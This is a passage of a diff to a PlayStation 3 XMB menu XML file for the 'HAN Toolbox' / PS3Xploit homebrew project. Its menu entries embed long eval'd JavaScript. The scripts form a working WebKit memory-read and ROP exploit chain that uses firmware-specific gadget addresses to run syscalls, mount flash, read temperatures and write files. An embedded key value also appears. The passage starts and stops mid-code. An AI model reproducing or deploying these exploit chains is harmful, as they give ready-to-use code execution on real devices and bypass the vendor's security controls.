initROP(a){try{if(a===true){frame_fails=0;search_base_off=0;search_size_ext=0}if(t_out!==0){clearTimeout(t_out);t_out=0}initDefaults();xtra_data=start_x.convert()+flash_partition1.convert()+filesystem_fat.convert()+mount_path_blind.convert()+unescape("\uFD7E");while(xtra_data_addr===0){if(search_max_threshold\74search_size){load_check();return}xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}flash_partition1_addr=xtra_data_addr+0x6;filesystem_fat_addr=flash_partition1_addr+flash_partition1.convertedSize()-0x4;mount_path_blind_addr=filesystem_fat_addr+filesystem_fat.convertedSize();stack_frame=stack_frame_hookup()+syscall(0x345,flash_partition1_addr,filesystem_fat_addr,mount_path_blind_addr,0,0,0,0,0)+stack_frame_exit();while(stack_frame_addr===0){if(search_max_threshold\74search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0}load_check();return}stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(stack_frame_addr==-1)if(search_max_threshold\74search_size+search_size_ext){frame_fails++;load_check();return}search_max_threshold-=search_size+search_size_ext}jump_2=unescape("\u0102\u7EFB")+fill_by_16bytes(0x30,0x8282)+hexw2bin(stack_frame_addr)+unescape("\uFB7E");while(jump_2_addr===0){if(search_max_threshold\74search_size){load_check();return}jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(jump_2_addr==-1)if(search_max_threshold\74search_size){load_check();return}search_max_threshold-=search_size}jump_1=unescape("\u4141\u7EFA")+hexw2bin(jump_2_addr)+unescape("\uFA7E");while(jump_1_addr===0){if(search_max_threshold\74search_size){load_check();return}jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(jump_1_addr==-1)if(search_max_threshold\74search_size){load_check();return}search_max_threshold-=search_size}var b=checkMemory(stack_frame_addr-0x4,0x8000,stack_frame.length);var x=checkMemory(xtra_data_addr-0x4,0x1000,xtra_data.length);var c=checkMemory(jump_2_addr-0x4,0x1000,jump_2.length);var d=checkMemory(jump_1_addr-0x4,0x1000,jump_1.length);if((c===jump_2)&&(d===jump_1)&&(x===xtra_data)&&(b===stack_frame)){if(t_out!==0){clearTimeout(t_out)}triggerX()}else{load_check()}}catch(e){}}function triggerX(){setTimeout(trigger,1000,jump_1_addr);setTimeout(rop_exit,2000,hr);setTimeout(window.close,2000);t_out=0;total_loops=0}initROP(true);');</String></Pair>
-			</Table>
-			<Table key="han_temperature_reader_offline">
-				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/web_temp.png</String></Pair>
-				<Pair key="title_rsc"><String>han_toolbox_temperature_reader</String></Pair>
-				<Pair key="info_rsc"><String>han_toolbox_temperature_reader_info</String></Pair>
-				<Pair key="module_name"><String>webrender_plugin</String></Pair>
-				<Pair key="module_action"><String>javascript:eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,ps3xploit_ecdsa_key="948DA13E8CAFD5BA0E90CE434461BB327FE7E080475EAA0AD3AD4F5B6247A7FDA86DF69790196773",index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,search_size=2*mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,mbytes=1048576,stat_size_offset=40,toc_addr=7296336,default_vsh_pub_toc=7263652,vsh_opd_patch=617820,vsh_opd_addr=7256936,vsh_ps3xploit_key_toc=7370612,toc_entry1_addr=7185360,toc_entry2_addr=7494200,toc_entry3_addr=7185352,toc_entry4_addr=7602176,toc_entry5_addr=7255744,toc_entry6_addr=0,gadget1_addr=620036,gadget2_addr=6332484,gadget3_addr=872540,gadget4_addr=2267192,gadget5_addr=1227548,gadget6_addr=6380604,gadget7_addr=131024,gadget8_addr=131072,gadget_mod1_addr=6352696,gadget_mod2_addr=80756,gadget_mod3_addr=757248,gadget_mod4a_addr=890500,gadget_mod7_addr=108204,gadget_mod8_addr=2862264,hr="\74hr\76",gadget12_addr=0x0C864C,ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple"));document.write(\47\74html\76\74title\76PS3Xploit - Temperature Reader\74/title\76\74div id="exploit"\76\74/div\76\74div id="trigger"\76\74/div\76\74div id="temps"\76\74/div\76\74/html\76\47);document.getElementById("temps").innerHTML="\74h1\76Reading CELL & RSX temperature values...";if(fwv=="4.84"){var toc_addr=7296344,default_vsh_pub_toc=7263660,vsh_opd_patch=617820,vsh_opd_addr=7256944,vsh_toc_addr_screenshot=7472764,vsh_ps3xploit_key_toc=7370860,toc_entry1_addr=7185360,toc_entry2_addr=7494456,toc_entry3_addr=7185352,toc_entry4_addr=7602176,toc_entry5_addr=7255752,toc_entry6_addr=0,gadget1_addr=620036,gadget2_addr=6332644,gadget3_addr=872540,gadget4_addr=2267192,gadget5_addr=1227548,gadget6_addr=6380764,gadget7_addr=131024,gadget8_addr=131072,gadget9_addr=170760,gadget10_addr=6479908,gadget11_addr=5874864,gadget12_addr=820812,gadget13_addr=4777384,gadget14_addr=4769696,gadget15_addr=4758664,gadget_mod1_addr=6352856,gadget_mod2_addr=80756,gadget_mod3_addr=757248,gadget_mod4a_addr=890500,gadget_mod4b_addr=4376440,gadget_mod4c_addr=346864,gadget_mod5_addr=4339932,gadget_mod6_addr=134144,gadget_mod7_addr=108204,gadget_mod8_addr=2862264,gadget_mod9_addr=68384,gadget_mod10_addr=1857428,gadget_mod11_addr=1618244,gadget_mod12_addr=6500860,gadget_mod13_addr=3369072,gadget_mod14_addr=6502656,gadget_mod15_addr=3788856,gadget_mod16_addr=5206828}function hex16(s){return(\470000\47+s).slice(-4)}function s2hex(a){var b=[];var i=0;for(;i\74a.length;i++){b.push(hex16(a.charCodeAt(i).toString(16)))}return b.join("")}function showTemps(){temp_cell=checkTempMem(0x8C000100-0x8,0x100,0x100,10);temp_cell=s2hex(temp_cell).slice(0,4);temp_cell_hex=temp_cell.slice(0,2);temp_cell_hex_final=parseInt(temp_cell_hex,16).toString();temp_rsx=checkTempMem(0x8C000200-0x8,0x100,0x100,10);temp_rsx=s2hex(temp_rsx).slice(0,4);temp_rsx_hex=temp_rsx.slice(0,2);temp_rsx_hex_final=parseInt(temp_rsx_hex,16).toString();document.getElementById("temps").innerHTML="\74h1\76CELL: "+temp_cell_hex_final+"&#176;\74br\76RSX: "+temp_rsx_hex_final+"&#176;\74/h1\76"}function hexh2bin(a){return String.fromCharCode(a)}function hexw2bin(a){return String.fromCharCode(a\76\7616)+String.fromCharCode(a)}function hexdw2bin(a){return hexw2bin(0)+hexw2bin(a)}String.prototype.toHex16=function(){return(\470000\47+this).substr(-4)};String.prototype.toAscii=function(a){var b=\47\47;var i=0;while(i\74this.length){if(a===true){b+=this.charCodeAt(i).toString(16).toHex16()}else{b+=this.charCodeAt(i).toString(16)}i+=1}return b};String.prototype.convert=function(a){if(this.length\741){return\47\47}var b=\47\47;var c=\47\47;var i=0;var d=[];if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\4700\47}if(b.substr(b.length-3,2)!==\4700\47){b+=\470000\47}while(i\74b.length){c=b.substr(i,4);d.push(String.fromCharCode(parseInt(c,16)));i+=4}return d.join(\47\47)};String.prototype.convertedSize=function(a){if(this.length\741){return 0}var b=\47\47;if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\4700\47}if(b.substr(b.length-3,2)!==\4700\47){b+=\470000\47}return b.length/2};String.prototype.replaceAt=function(a,b){return this.substr(0,a)+b+this.substr(a+b.length)};String.prototype.repeat=function(a){return new Array(a+1).join(this)};Number.prototype.noExponents=function(){var a=String(this).split(/[eE]/);if(a.length===1){return a[0]}var z=\47\47,sign=this\740?\47-\47:\47\47,str=a[0].replace(\47.\47,\47\47),mag=Number(a[1])+1;if(mag\740){z=sign+\470.\47;while(mag++){z+=\470\47}return z+str.replace(/^\-/,\47\47)}mag-=str.length;while(mag--){z+=\470\47}return str+z};function fromIEEE754(a,b,c){var d=0;var g=[];var i;var j;var h;for(i=a.length;i;i-=1){h=a[i-1];for(j=8;j;j-=1){g.push(h%2?1:0);h=h\76\761}}g.reverse();var k=g.join(\47\47);var l=(1\74\74(b-1))-1;var s=parseInt(k.substring(0,1),2)?-1:1;var e=parseInt(k.substring(1,1+b),2);var f=parseInt(k.substring(1+b),2);if(e===(1\74\74b)-1){d=f!==0?NaN:s*Infinity}else if(e\760){d=s*Math.pow(2,e-l)*(1+f/Math.pow(2,c))}else if(f!==0){d=s*Math.pow(2,-(l-1))*(f/Math.pow(2,c))}else{d=s*0}return d.noExponents()}function generateIEEE754(a,b){var c=new Array((a\76\7624)&0xFF,(a\76\7616)&0xFF,(a\76\768)&0xFF,(a)&0xFF,(b\76\7624)&0xFF,(b\76\7616)&0xFF,(b\76\768)&0xFF,(b)&0xFF);return fromIEEE754(c,11,52)}function generateExploit(a,b){var n=(a\74\7432)|((b\76\761)-1);return generateIEEE754(a,(n-a))}function readMemory(a,b){if(document.getElementById(\47exploit\47)){document.getElementById(\47exploit\47).style.src="local("+generateExploit(a,b)+")"}}function checkTempMem(a,b,c,d){if(document.getElementById(\47exploit\47)){readMemory(a,b);return document.getElementById(\47exploit\47).style.src.substr(d,c)}}function checkMemory(a,b,c){if(document.getElementById(\47exploit\47)){readMemory(a,b);return document.getElementById(\47exploit\47).style.src.substr(6,c)}}function trigger(a){if(document.getElementById(\47trigger\47)){document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+a.toString(16)+")")}}function load_check(){if(total_loops\74max_loops){t_out=setTimeout(initROP,1000,false)}else{total_loops=0;t_out=0}}function findJsVariableOffset(a,b,c,d){readMemory(c,d);var e=document.getElementById(\47exploit\47).style.src.substr(6,d);var i=0;var t;var k;var f;var g;while(i\74(e.length*2)){if(e.charCodeAt(i/2)===b.charCodeAt(0)){f=0;for(k=0;k\74(b.length*2);k+=0x2){if(e.charCodeAt((i+k)/2)!==b.charCodeAt(k/2)){break}f+=1}if(f===b.length){g=c+i+4;for(t=0;t\74offset_array.length;t+=1){if(offset_array[t]===g){return-1}}offset_array.push(g);return g}}i+=0x10}var h=c+d;return 0}function stack_frame_hookup(){return unescape("\u4141\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41)}function stack_frame_exit(){return hexdw2bin(gadget_mod8_addr)+unescape("\u2F2A")}function syscall(a,b,c,d,e,f,g,h,i,j){if(j===null){j=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(a)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(j)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function callsub(a,b,c,d,e,f,g,h,i,j,k,l,m){var n=0x20;if(m===null){m=gtemp_addr}if(l===null){l=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(j)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(l)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(a)+fill_by_16bytes(k-n,dbyte00)+hexdw2bin(m)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function fill_by_4bytes(a,b){var c=\47\47;var d=0;var e=hexh2bin(b);while(d\74a/4){c+=e.repeat(2);d++}return c}function fill_by_8bytes(a,b){var c=\47\47;var d=0;var e=hexh2bin(b);while(d\74a/8){c+=e.repeat(4);d++}return c}function fill_by_16bytes(a,b){var c=\47\47;var d=0;var e=hexh2bin(b);while(d\74a/16){c+=e.repeat(8);d++}return c}function initDefaults(){offset_array=[];xtra_data_addr=0;stack_frame_addr=0;jump_2_addr=0;jump_1_addr=0;ps3xploit_ecdsa_key_addr=0;index_key_addr=0;search_max_threshold=70*0x100000;search_base=0x80100000;search_size=2*mbytes;search_size_ext=0*mbytes;search_base_off=0*mbytes;total_loops++}function initROP(a){try{if(a===true){frame_fails=0;search_base_off=0;search_size_ext=0}if(t_out!==0){clearTimeout(t_out);t_out=0}initDefaults();xtra_data=start_x.convert()+unescape("\uFD7E");while(xtra_data_addr===0){if(search_max_threshold\74search_size){load_check();return}xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}stack_frame=stack_frame_hookup()+syscall(0x0000017F,0,0x8C000100,0,0,0,0,0,0)+syscall(0x0000017F,1,0x8C000200,0,0,0,0,0,0)+stack_frame_exit();while(stack_frame_addr===0){if(search_max_threshold\74search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0}load_check();return}stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(stack_frame_addr==-1)if(search_max_threshold\74search_size+search_size_ext){frame_fails++;load_check();return}search_max_threshold-=search_size+search_size_ext}jump_2=unescape("\u0102\u7EFB")+fill_by_16bytes(0x30,0x8282)+hexw2bin(stack_frame_addr)+unescape("\uFB7E");while(jump_2_addr===0){if(search_max_threshold\74search_size){load_check();return}jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(jump_2_addr==-1)if(search_max_threshold\74search_size){load_check();return}search_max_threshold-=search_size}jump_1=unescape("\u4141\u7EFA")+hexw2bin(jump_2_addr)+unescape("\uFA7E");while(jump_1_addr===0){if(search_max_threshold\74search_size){load_check();return}jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(jump_1_addr==-1)if(search_max_threshold\74search_size){load_check();return}search_max_threshold-=search_size}var b=checkMemory(stack_frame_addr-0x4,0x8000,stack_frame.length);var x=checkMemory(xtra_data_addr-0x4,0x1000,xtra_data.length);var c=checkMemory(jump_2_addr-0x4,0x1000,jump_2.length);var d=checkMemory(jump_1_addr-0x4,0x1000,jump_1.length);if((c===jump_2)&&(d===jump_1)&&(x===xtra_data)&&(b===stack_frame)){if(t_out!==0){clearTimeout(t_out)}triggerX()}else{load_check()}}catch(e){}}function triggerX(){setTimeout(trigger,1000,jump_1_addr);setTimeout(showTemps,2000);t_out=0;total_loops=0}initROP(true);');</String></Pair>
-			</Table>
-			<Table key="han_dex_settings_injector">
-				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_debug.png</String></Pair>
-				<Pair key="title_rsc"><String>han_toolbox_dex_xmb_setup</String></Pair>
-				<Pair key="info_rsc"><String>han_toolbox_dex_xmb_setup_info</String></Pair>
-			</Table>
 		</Attributes>
-		<Items>			
-			<Query 
-				class="type:x-xmb/module-action"
-				key="han_database_rebuilder_offline"
-				attr="han_database_rebuilder_offline"
-				/>
+		<Items>	
 			<Query 
 				class="type:x-xmb/module-action"
 				key="han_file_copier_offline"
@@ -71,6 +82,41 @@
 				attr="han_file_injector" 				
 				src="#han_file_injector_items"
 				/>
+		</Items>
+	</View>
+	
+<!-- Main Items > Advanced Tools > System Operations (CEX mode) -->
+		
+	<View id="han_system_operations_items">
+		<Attributes>			
+			<Table key="han_database_rebuilder_offline">
+				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/rebuild.png</String></Pair>
+				<Pair key="title_rsc"><String>han_toolbox_database_rebuilder</String></Pair>
+				<Pair key="info_rsc"><String>han_toolbox_database_rebuilder_info</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>javascript:eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,debug=!1,ps3xploit_ecdsa_key="948DA13E8CAFD5BA0E90CE434461BB327FE7E080475EAA0AD3AD4F5B6247A7FDA86DF69790196773",index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,search_size=2*mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,mbytes=1048576,stat_size_offset=40,toc_addr=7296336,default_vsh_pub_toc=7263652,vsh_opd_patch=617820,vsh_opd_addr=7256936,vsh_ps3xploit_key_toc=7370612,toc_entry1_addr=7185360,toc_entry2_addr=7494200,toc_entry3_addr=7185352,toc_entry4_addr=7602176,toc_entry5_addr=7255744,toc_entry6_addr=0,gadget1_addr=620036,gadget2_addr=6332484,gadget3_addr=872540,gadget4_addr=2267192,gadget5_addr=1227548,gadget6_addr=6380604,gadget7_addr=131024,gadget8_addr=131072,soft_reboot=0x200,sc_sm_shutdown=0x17B,gadget12_addr=0x0C864C,sc_fs_open=0x321,gadget_mod4b_addr=0x42C778,fs_flag_create=0x241,fs_mode=0x1B6,sc_fs_write=0x323,sc_fs_close=0x324,gadget_mod1_addr=6352696,gadget_mod2_addr=80756,gadget_mod3_addr=757248,gadget_mod4a_addr=890500,gadget_mod7_addr=108204,gadget_mod8_addr=2862264,hr="\74hr\76",path_db_rebuild="/dev_hdd0/mms/db.err",db_rebuild_bytes=0x000003E9,ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple"));document.write(\47\74html\76\74head\76\74title\76PS3Xploit - Offline Database Rebuilder by lmn7\74/title\76\74/head\76\74body id="bodyId" style="background-color:#FFFFFF"\76\74div id="headerId"\76\74h1\76Rebuilding database...\74/h1\76\74span id="hideme" style="visibility:hidden"\76\74p\76\74button id="btnROP" type="button" onclick="initROP(true);" autofocus\76Initialize\74/button\76 | Close \74input type="checkbox" id="auto_close" name="aclose" checked="checked" onclick="autoclose();"/\76\74span id="dex_txt" style="visibility:hidden"\76\74input type="checkbox" id="dex" name="DEX" disabled="" onclick="dex();"/\76\74/span\76\74/p\76\74p\76\74button id="btnTrigger" disabled="" type="button" onclick="triggerX();"\76En\74/button\76\74span id="reset" style="visibility:hidden"\76 | \74button id="btnReset" type="button" onclick="disable_trigger();"\76Reset\74/button\76\74/span\76\74/p\76\74/span\76\74div id="exploit" \76\74/div\76\74div id="trigger"\76\74/div\76\74/body\76\74/html\76\47);if(fwv=="4.84"){var toc_addr=7296344,default_vsh_pub_toc=7263660,vsh_opd_patch=617820,vsh_opd_addr=7256944,vsh_toc_addr_screenshot=7472764,vsh_ps3xploit_key_toc=7370860,toc_entry1_addr=7185360,toc_entry2_addr=7494456,toc_entry3_addr=7185352,toc_entry4_addr=7602176,toc_entry5_addr=7255752,toc_entry6_addr=0,gadget1_addr=620036,gadget2_addr=6332644,gadget3_addr=872540,gadget4_addr=2267192,gadget5_addr=1227548,gadget6_addr=6380764,gadget7_addr=131024,gadget8_addr=131072,gadget9_addr=170760,gadget10_addr=6479908,gadget11_addr=5874864,gadget12_addr=820812,gadget13_addr=4777384,gadget14_addr=4769696,gadget15_addr=4758664,gadget_mod1_addr=6352856,gadget_mod2_addr=80756,gadget_mod3_addr=757248,gadget_mod4a_addr=890500,gadget_mod4b_addr=4376440,gadget_mod4c_addr=346864,gadget_mod5_addr=4339932,gadget_mod6_addr=134144,gadget_mod7_addr=108204,gadget_mod8_addr=2862264,gadget_mod9_addr=68384,gadget_mod10_addr=1857428,gadget_mod11_addr=1618244,gadget_mod12_addr=6500860,gadget_mod13_addr=3369072,gadget_mod14_addr=6502656,gadget_mod15_addr=3788856,gadget_mod16_addr=5206828}function syscall_r3_p2p(a,b,c,d,e,f,g,h,i,j){if(j===null){j=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(a)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4b_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(j)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function save_file_overwrite(a,b,c,d,e,f){return syscall(sc_fs_open,a,fs_flag_create,b,fs_mode,f,0,0,0)+syscall_r3_p2p(sc_fs_write,b,c,e,d,0,0,0,0,0,0)+syscall_r3_p2p(sc_fs_close,b,0,0,0,0,0,0,0,0,0)}function hexh2bin(a){return String.fromCharCode(a)}function hexw2bin(a){return String.fromCharCode(a\76\7616)+String.fromCharCode(a)}function hexdw2bin(a){return hexw2bin(0)+hexw2bin(a)}String.prototype.toHex16=function(){return(\470000\47+this).substr(-4)};String.prototype.toAscii=function(a){var b=\47\47;var i=0;while(i\74this.length){if(a===true){b+=this.charCodeAt(i).toString(16).toHex16()}else{b+=this.charCodeAt(i).toString(16)}i+=1}return b};String.prototype.convert=function(a){if(this.length\741){return\47\47}var b=\47\47;var c=\47\47;var i=0;var d=[];if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\4700\47}if(b.substr(b.length-3,2)!==\4700\47){b+=\470000\47}while(i\74b.length){c=b.substr(i,4);d.push(String.fromCharCode(parseInt(c,16)));i+=4}return d.join(\47\47)};String.prototype.convertedSize=function(a){if(this.length\741){return 0}var b=\47\47;if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\4700\47}if(b.substr(b.length-3,2)!==\4700\47){b+=\470000\47}return b.length/2};String.prototype.replaceAt=function(a,b){return this.substr(0,a)+b+this.substr(a+b.length)};String.prototype.repeat=function(a){return new Array(a+1).join(this)};Number.prototype.noExponents=function(){var a=String(this).split(/[eE]/);if(a.length===1){return a[0]}var z=\47\47,sign=this\740?\47-\47:\47\47,str=a[0].replace(\47.\47,\47\47),mag=Number(a[1])+1;if(mag\740){z=sign+\470.\47;while(mag++){z+=\470\47}return z+str.replace(/^\-/,\47\47)}mag-=str.length;while(mag--){z+=\470\47}return str+z};function fromIEEE754(a,b,c){var d=0;var g=[];var i;var j;var h;for(i=a.length;i;i-=1){h=a[i-1];for(j=8;j;j-=1){g.push(h%2?1:0);h=h\76\761}}g.reverse();var k=g.join(\47\47);var l=(1\74\74(b-1))-1;var s=parseInt(k.substring(0,1),2)?-1:1;var e=parseInt(k.substring(1,1+b),2);var f=parseInt(k.substring(1+b),2);if(e===(1\74\74b)-1){d=f!==0?NaN:s*Infinity}else if(e\760){d=s*Math.pow(2,e-l)*(1+f/Math.pow(2,c))}else if(f!==0){d=s*Math.pow(2,-(l-1))*(f/Math.pow(2,c))}else{d=s*0}return d.noExponents()}function generateIEEE754(a,b){var c=new Array((a\76\7624)&0xFF,(a\76\7616)&0xFF,(a\76\768)&0xFF,(a)&0xFF,(b\76\7624)&0xFF,(b\76\7616)&0xFF,(b\76\768)&0xFF,(b)&0xFF);return fromIEEE754(c,11,52)}function generateExploit(a,b){var n=(a\74\7432)|((b\76\761)-1);return generateIEEE754(a,(n-a))}function readMemory(a,b){if(document.getElementById(\47exploit\47)){document.getElementById(\47exploit\47).style.src="local("+generateExploit(a,b)+")"}}function checkMemory(a,b,c){if(document.getElementById(\47exploit\47)){readMemory(a,b);if(debug===true){var x=document.getElementById(\47exploit\47).style.src.substr(6,c);return x}return document.getElementById(\47exploit\47).style.src.substr(6,c)}}function trigger(a){if(document.getElementById(\47trigger\47)){document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+a.toString(16)+")")}}function rop_exit(a){var b=document.getElementById(\47auto_close\47);if(b){if(b.checked===true)window.close()}}function load_check(){if(total_loops\74max_loops){t_out=setTimeout(initROP,1000,false)}else{total_loops=0;t_out=0}}function findJsVariableOffset(a,b,c,d){readMemory(c,d);var e=document.getElementById(\47exploit\47).style.src.substr(6,d);var i=0;var t;var k;var f;var g;while(i\74(e.length*2)){if(e.charCodeAt(i/2)===b.charCodeAt(0)){f=0;for(k=0;k\74(b.length*2);k+=0x2){if(e.charCodeAt((i+k)/2)!==b.charCodeAt(k/2)){break}f+=1}if(f===b.length){g=c+i+4;for(t=0;t\74offset_array.length;t+=1){if(offset_array[t]===g){return-1}}offset_array.push(g);return g}}i+=0x10}var h=c+d;return 0}function memcpy(a,b,c){return callsub(gadget8_addr,a,b,c,0,0,0,0,0,0,0x70)}function store_word(a,b,c,d,e){if(c===null){c=gtemp_addr}if(d===null){d=gtemp_addr}if(e===null){e=gtemp_addr}return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(b)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(a-0xC74)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod7_addr)+fill_by_16bytes(0x70,dbyte41)+hexdw2bin(c)+hexdw2bin(d)+hexdw2bin(e)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function stack_frame_hookup(){return unescape("\u4141\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41)}function stack_frame_exit(){return hexdw2bin(gadget_mod8_addr)+unescape("\u2F2A")}function syscall(a,b,c,d,e,f,g,h,i,j){if(j===null){j=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(a)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(j)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function callsub(a,b,c,d,e,f,g,h,i,j,k,l,m){var n=0x20;if(m===null){m=gtemp_addr}if(l===null){l=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(j)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(l)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(a)+fill_by_16bytes(k-n,dbyte00)+hexdw2bin(m)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function fill_by_4bytes(a,b){var c=\47\47;var d=0;var e=hexh2bin(b);while(d\74a/4){c+=e.repeat(2);d++}return c}function fill_by_8bytes(a,b){var c=\47\47;var 